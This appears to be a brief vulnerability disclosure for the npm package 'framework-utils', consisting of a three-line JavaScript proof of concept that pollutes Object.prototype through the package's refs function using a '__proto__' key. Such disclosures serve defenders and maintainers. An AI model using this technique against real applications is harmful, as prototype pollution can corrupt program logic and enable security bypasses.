# framework-utils

- package name: `framework-utils`

- PoC exploit:

```javascript
var utils = require('framework-utils');
utils.refs({}, '__proto__', 'polluted')('yes');
// Object.prototype.polluted === 'yes'
```